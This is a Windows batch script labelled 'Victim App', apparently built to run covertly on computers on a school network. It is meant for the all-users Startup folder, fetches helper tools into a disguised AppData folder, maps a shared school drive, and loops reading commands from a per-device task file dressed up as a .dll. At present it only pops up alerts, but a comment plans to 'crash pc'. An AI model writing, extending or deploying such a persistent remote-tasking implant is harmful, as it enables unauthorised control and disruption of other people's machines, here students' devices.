:: Victim App
:: Written by 1k0de
@echo off & title SLChat_VictimApp & cls
:: ONLY CHANGEABLE VARIABLES ::
set "_localMode=true"
set "_deviceID=SR_1"
:::::::::::::::::::::::::::::::
:: SHOULD BE STORED IN: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
:::::::::::::::::::::::::::::::

setlocal EnableDelayedExpansion

set "_Path=P:\Composite\All Students"
set "_COMMS=__SLChat_COMMS"

set "_appComponentsLocation=C:\Users\!username!\AppData\Roaming"
if not exist "!_appComponentsLocation!\WindowsDataInfoSL" (
    mkdir "!_appComponentsLocation!\WindowsDataInfoSL"
)
set "_appComponentsLocation=C:\Users\!username!\AppData\Roaming\WindowsDataInfoSL"

cURL -L --output "!_appComponentsLocation!/DelLine.exe" --url "https://github.com/Batch-Man/DelLine/blob/main/Files/DelLine.exe?raw=true"
cURL -o "!_appComponentsLocation!/nircmd.zip" https://www.nirsoft.net/utils/nircmd.zip
tar -xf "!_appComponentsLocation!/nircmd.zip" -C "!_appComponentsLocation!"
del "!_appComponentsLocation!\nircmd.zip"

if "!_localMode!" == "true" (
    set "_Path=All Students"
)

if "!_deviceID!" == "" (
    echo.
    echo DEVICE ID IS INVALID... CANNOT RUN VICTIM APP...
    ping localhost -n 4 > nul
    exit
)

goto pathSearch_loop

:pathSearch_loop
echo.
echo Searching for Path...
ping localhost -n 2 > nul
if "!_localMode!" == "true" (
    if not exist "!_Path!" (
        echo LOCAL PATH DOES NOT EXIST...
        echo SEARCHING....
        goto pathSearch_loop
    )

    goto setupDeviceFolder
)

:: Check to see if collaboration exists, if not get collaboration
if not exist "!_Path!" (
    echo CANNOT FIND SHARED PATH...
    echo SETTING P: DRIVE TO NETWORK COLLABORATION...
    echo SEARCHING....
    ::Set the P: drive to collaboration, bypass collaboration loading time
    net use P: \\DETNSW.WIN\8252\Collaboration
    goto pathSearch_loop
)
goto setupDeviceFolder
pause > nul
exit

:setupDeviceFolder
echo.
echo Searching for device folder...
if not exist "!_Path!\!_COMMS!\!_deviceID!" (
    echo.
    echo CANNOT FIND DEVICE FOLDER... CREATING IT...
    ping localhost -n 2 > nul
    mkdir "!_Path!\!_COMMS!\!_deviceID!"
    echo.
    echo SUCCESSFULLY CREATED DEVICE COMM FOLDER...
)
echo.
echo SEARCHING FOR TASKS...
echo.
if not exist "!_Path!\!_COMMS!\!_deviceID!\_tasks.dll" (
    echo off>>"!_Path!\!_COMMS!\!_deviceID!\_tasks.dll"
    echo SUCCESSFULLY CREATED TASKS FOLDER...
)
set "TASKS=!_Path!\!_COMMS!\!_deviceID!\_tasks.dll"

goto readCommandLoop
pause > nul
exit

:Execute_Task
setlocal

::Parameters
set "cmdName=%~1"
set "_delay=%~2"

::Logic
if "!cmdName!" == "message" (
    :: Minimize all apps on device
    Call "!_appComponentsLocation!/nircmd.exe" sendkeypress rwin+home

    ::Display message
    Call "!_appComponentsLocation!/nircmd.exe" infobox "This is your custom alert!" "Alert Title"
    ::powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class MinimizeWindow { [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow(); [DllImport(\"user32.dll\")] public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam); public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam); }' -PassThru | Out-Null; [MinimizeWindow]::EnumWindows({$args[0]; [MinimizeWindow]::ShowWindow($args[0],2)},0)"
    ::Open all apps and crash pc
)

endlocal
goto :eof

:readCommandLoop
set "_latestTask="
echo.
echo AWAITING TASKS...
ping localhost -n 2 > nul

set /p _latestTask=<!TASKS!
if "!_latestTask!" NEQ "" (
    echo FOUND TASK: !_latestTask!

    CALL !_appComponentsLocation!\DelLine "!TASKS!" "1"

    ping localhost -n 2 > nul
)

goto readCommandLoop
